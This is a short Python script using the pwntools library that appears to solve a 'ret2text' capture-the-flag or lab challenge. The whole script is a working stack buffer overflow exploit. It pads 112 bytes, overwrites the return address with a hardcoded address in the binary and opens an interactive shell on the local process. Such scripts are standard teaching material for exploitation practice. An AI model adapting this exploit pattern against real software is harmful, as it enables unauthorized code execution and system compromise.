from pwn import *
system_addr = 0x0804863A
offset = 108 + 4
sh = process('./ret2text')
payload = b'A' * offset + p32(system_addr)
sh.sendline(payload)
sh.interactive()
